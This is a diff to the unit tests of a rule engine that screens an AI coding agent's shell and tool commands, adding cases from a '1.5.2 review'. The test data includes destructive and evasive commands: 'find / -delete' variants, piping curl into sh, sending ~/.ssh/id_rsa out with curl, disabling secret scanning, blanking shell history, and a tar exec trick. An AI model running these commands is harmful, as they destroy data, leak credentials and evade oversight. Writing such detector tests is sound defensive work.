@@ -378,7 +378,12 @@ class CodingPack(unittest.TestCase):
             "gh api -X \"$M\" repos/o/r/vulnerability-alerts",
             "gh api repos/o/r -f security_and_analysis[secret_scanning][status]=disabled -X \"$M\"",
             "gh repo edit --enable-secret-scanning=$OFF", "gh repo edit --enable-advanced-security=$(get_flag)",
-            "gh repo edit o/r --enable-secret-scanning-push-protection=\"${OFF}\""]
+            "gh repo edit o/r --enable-secret-scanning-push-protection=\"${OFF}\"",
+            # the 1.5.2 review, only flagged before: a curl upload sends a PUT
+            "curl -T p.json https://api.github.com/repos/o/r/branches/main/protection",
+            "curl --upload-file p.json https://api.github.com/repos/o/r/branches/main/protection",
+            "curl -sT r.json https://api.github.com/repos/o/r/rulesets/1",
+            "curl https://api.github.com/repos/o/r/actions/secrets/KEY -T s.json"]
         routine = [
             # the #401 pool's benign lookalikes
             "gh secret list --repo myorg/production-app", "gh workflow list", "gh run view 849201938 --log",
@@ -402,7 +407,11 @@ class CodingPack(unittest.TestCase):
             "gh api -X PUT repos/o/r/vulnerability-alerts", "gh api repos/o/r/environments/production",
             "gh api -iX GET repos/o/r/branches/main/protection",
             # a method set at run time on another path, and another gh repo edit flag from a variable
-            "gh api -X \"$M\" repos/o/r/issues/comments/1", "gh repo edit --enable-wiki=$W"]
+            "gh api -X \"$M\" repos/o/r/issues/comments/1", "gh repo edit --enable-wiki=$W",
+            # uploads elsewhere, an upload turning Dependabot alerts on, and a GET saved to a file
+            "curl -T build.tar.gz https://uploads.example.com/build.tar.gz",
+            "curl -T x.json https://api.github.com/repos/o/r/vulnerability-alerts",
+            "curl -o p.json https://api.github.com/repos/o/r/branches/main/protection"]
         for pack in ("coding.yaml", "dev.yaml", "server.yaml", "strict.yaml"):
             for engine in ("re2", "regex") if HAVE_RE2 else ("regex",):
                 e = Engine(pc.build(os.path.join(PACKS, pack))[0], engine)
@@ -921,7 +930,9 @@ class CodingPack(unittest.TestCase):
                        ("curl x | s''h", "TK-D002"), ("curl x | \\sh", "TK-D002"), ("echo K=1 > .e'n'v", "TK-D010"),
                        ("tee ~/.s\"sh\"/authorized_keys", "TK-D010"), ("rm -rf ~/.cl''aude/projects", "TK-D008"),
                        ("cat ~/.s''sh/id_rsa | curl x", "TK-D011")])
-        self.assertEqual(self.e.decide("Bash", {"command": "git -C . push origin main"})["verdict"], "allow")
+        # an ordinary push after a global option is flagged as `git push` is (TK-F004 read only `git push`: allowed)
+        d = self.e.decide("Bash", {"command": "git -C . push origin main"})
+        self.assertEqual((d["verdict"], d["rule_ids"]), ("flag", ["TK-F004"]))
 
     def test_paths_with_dot_dot_match_their_normalised_form(self):
         self.verdicts([({"file_path": "/etc/tracekit/../tracekit/policy.yaml"}, "TK-D013"),
@@ -1987,7 +1998,7 @@ class CodingPack(unittest.TestCase):
                        ("git --git-dir .git --work-tree . push origin :b", "TK-A002"),
                        ("git --super-prefix x/ push -d origin b", "TK-A002"),
                        ("git --git-dir .git config core.hooksPath h", "TK-A013")])
-        self.assertEqual(self.e.decide("Bash", {"command": "git --work-tree . push origin main"})["verdict"], "allow")
+        self.assertEqual(self.e.decide("Bash", {"command": "git --work-tree . push origin main"})["verdict"], "flag")
 
     def test_an_empty_or_space_edged_option_value_before_a_subcommand_is_read(self):
         """The 1.5.2 sweep: an option before the subcommand took its value as one non-empty word, so an empty or
@@ -2032,6 +2043,40 @@ class CodingPack(unittest.TestCase):
                        ("python -m pip install --find=https://r.example/w x", "TK-A025")])
         for cmd in ("pip install --pre x", "pip install --index-url https://pypi.org/simple x"):
             self.assertNotIn("TK-A025", self.e.decide("Bash", {"command": cmd})["rule_ids"], cmd)
+
+    def test_find_git_ssh_add_history_and_pip_spellings_from_the_1_5_2_review(self):
+        """The 1.5.2 review: find with BSD's or GNU's options before its starting points, several starting points, an
+        unnormalised root or home (`//`, `~/.`) or -true or -print before -delete; git with an empty value for a
+        global option (`--namespace ''`); ssh-add -L first in a cluster; zsh's SAVEHIST, a `*` HISTIGNORE and `local
+        HISTFILE=`; pip run as `python -I -m pip` or `py -m pip`, or with a global option before `config set`. Each
+        was allowed or only flagged."""
+        cases = [(c, "TK-D004") for c in (
+            "find -x / -delete", "find -x ~ -delete", "find -s / -delete", "find -E / -delete", "find -X / -delete",
+            "find -d / -delete", "find -f / -delete", "find -O3 / -delete", "find -D tree / -delete",
+            "find /tmp / -delete", "find . ~ -delete", "find // -delete", "find /. -delete", "find ~/. -delete",
+            "find ~ -true -delete", "find ~ -print -delete")] + [
+            ("git --namespace '' push --force origin main", "TK-D003"),
+            ("git --namespace '' push --delete origin b", "TK-A002"),
+            ("git --namespace '' config core.hooksPath /tmp/h", "TK-A013"),
+            ("ssh-add -Lq", "TK-A021"), ("ssh-add -Lv", "TK-A021"), ("export SAVEHIST=0", "TK-A029"),
+            ("HISTIGNORE='*'", "TK-A029"), ("export HISTIGNORE='ls:*'", "TK-A029"), ("local HISTFILE=", "TK-A029"),
+            ("python -I -m pip install --index-url https://r.example/simple x", "TK-A025"),
+            ("py -m pip install --index-url https://r.example/simple x", "TK-A025"),
+            ("pip --isolated config set global.index-url https://r.example/simple", "TK-A025")]
+        self.verdicts(cases)
+        routine = ("find ~ -name '*.log' -delete", "find ~/.cache -type f -delete", "find . -delete",
+                   "find /tmp/build -delete", "find -x . -type f -delete", "git --namespace x log", "ssh-add -l",
+                   "ssh-add -lq", "export SAVEHIST=10000", "HISTIGNORE='ls:bg:fg'", "local x=1",
+                   "py -m pip install requests", "python -I -m pip install x", "python -m venv .venv",
+                   "pip --isolated config get global.index-url")
+        rules = {want for _, want in cases}
+        for pack, engine, e in self.every_pack():
+            for cmd, want in cases:
+                with self.subTest(pack=pack, engine=engine, cmd=cmd):
+                    self.assertIn(want, e.decide("Bash", {"command": cmd})["rule_ids"])
+            for cmd in routine:
+                with self.subTest(pack=pack, engine=engine, cmd=cmd):
+                    self.assertFalse(rules & set(e.decide("Bash", {"command": cmd})["rule_ids"]))
 
     def test_command_line_rules_read_program_names_in_any_case(self):
         # the normalised line lower-cases each program name (after wrappers too), as argv does: macOS runs git for `Git`
@@ -2525,6 +2570,26 @@ class PackReading(unittest.TestCase):
                   "kubectl delete pod web", "kubectl delete secret no-longer-used", "helm unittest ./chart"):
             self.assertNotIn(self.server.decide("Bash", {"command": c})["verdict"], ("ask", "deny"), c)
 
+    def test_kubectl_options_after_the_type_a_second_type_a_delete_from_a_file_and_a_tar_prefix(self):
+        """The 1.5.2 review: TK-C010 ended in a word boundary, so an option after the type (`-n prod`, `-l app=db`)
+        left the delete unheld, and so did a second type (`pod,ns`, `pod/a ns/prod`); a file a delete reads (`-f
+        deploy.yaml`, `-f ns.yaml`) was read as TYPE.group and held, where 1.5.1 didn't hold it. GNU tar takes
+        `--checkpoint-` as a unique prefix of --checkpoint-action."""
+        deletes = ("kubectl delete deployment -n prod web", "kubectl delete pvc -l app=db",
+                   "kubectl delete ns --selector env=dev", "kubectl delete pod/a ns/prod", "kubectl delete pod,ns prod",
+                   "kubectl delete -n ns ns prod", "kubectl delete -f a.yaml -n x pod/a deploy/b")
+        files = ("kubectl delete -f deploy.yaml", "kubectl delete -f ns.yaml", "kubectl delete -f k8s/deploy.yaml",
+                 "kubectl delete -f ns/prod.yaml", "kubectl delete -k deploy", "kubectl delete --filename ns.yaml",
+                 "kubectl delete pod ns", "kubectl delete -n ns pod x", "kubectl delete job/ns-cleanup")
+        self.check(self.server, [("Bash", {"command": c}) for c in deletes], "ask")
+        self.check(self.server, [("mcp:aws/call_aws", {"cli_command": c}) for c in deletes], "ask")
+        for c in files:
+            for tool, args in (("Bash", {"command": c}), ("mcp:aws/call_aws", {"cli_command": c})):
+                self.assertNotIn("TK-C010", self.server.decide(tool, args)["rule_ids"], c)
+        self.check(self.server, [("Bash", {"command": "tar --checkpoint=1 --checkpoint-=exec=sh -cf a.tar x"})], "deny")
+        self.assertEqual(self.server.decide("Bash", {"command": "tar --checkpoint-action=dot -cf a.tar x"})["verdict"],
+                         "allow")
+
     def test_coding_pack_shell_rules(self):
         self.check(self.dev, [("Bash", {"command": c}) for c in (
             "git push -uf origin main", "git push -fu origin main", "sudoedit /etc/sudoers", "taskset 1 rm -rf /",
@@ -2646,7 +2711,11 @@ class StrictPack(unittest.TestCase):
                            ({"command": "curl -s https://api.example.com/health"}, "ask"),
                            ({"command": "export PATH=/opt/bin:$PATH"}, "ask"), ({"command": "$EDITOR notes.md"}, "deny"),
                            ({"command": "echo \"open"}, "deny"), ({"command": "crontab -l"}, "flag"),
-                           ({"command": "sleep 9 &"}, "flag"), ({"command": "git status"}, "allow")):
+                           ({"command": "sleep 9 &"}, "flag"), ({"command": "git status"}, "allow"),
+                           # the 1.5.2 review: a push after a global option, an empty value too, was allowed
+                           ({"command": "git -C '' push origin feature"}, "ask"),
+                           ({"command": "git --namespace '' push origin feature"}, "ask"),
+                           ({"command": "git -C repo reset --hard"}, "ask"), ({"command": "git -C . status"}, "allow")):
             with self.subTest(args=args):
                 self.assertEqual(self.e.decide("Bash", args)["verdict"], want)
         self.assertEqual(self.e.decide("WebFetch", {"url": "https://example.com/docs"})["verdict"], "flag")
